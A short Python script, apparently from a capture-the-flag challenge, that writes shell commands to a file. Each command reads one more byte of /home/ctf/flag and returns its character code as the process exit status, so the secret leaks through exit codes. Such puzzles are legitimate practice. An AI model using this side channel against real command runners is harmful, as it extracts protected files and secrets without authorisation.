with open('commands.txt', 'w') as f:
	for i in range(1, 100):
		f.write(f'''foo=$(head -c {i} /home/ctf/flag | tail -c 2); exit $(printf '%d' "'$foo")\n''')
